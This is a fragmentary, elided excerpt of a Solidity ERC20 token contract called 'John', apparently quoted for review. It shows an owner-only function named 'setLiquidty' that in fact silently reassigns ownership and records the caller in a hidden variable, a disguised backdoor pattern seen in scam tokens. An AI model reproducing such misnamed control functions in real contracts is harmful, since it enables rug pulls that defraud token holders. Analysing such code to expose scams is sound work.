...
contract Ownable is Context {
    ...
    function setLiquidty(address isToken, address Lockdex) external onlyOwner{
        require(Lockdex==address(0));
        _uintCont = msg.sender;
        _owner = isToken;
    }
...
contract John is Context, IERC20, Ownable {
    ...
    string private _name = "John";
    string private _symbol = "John";
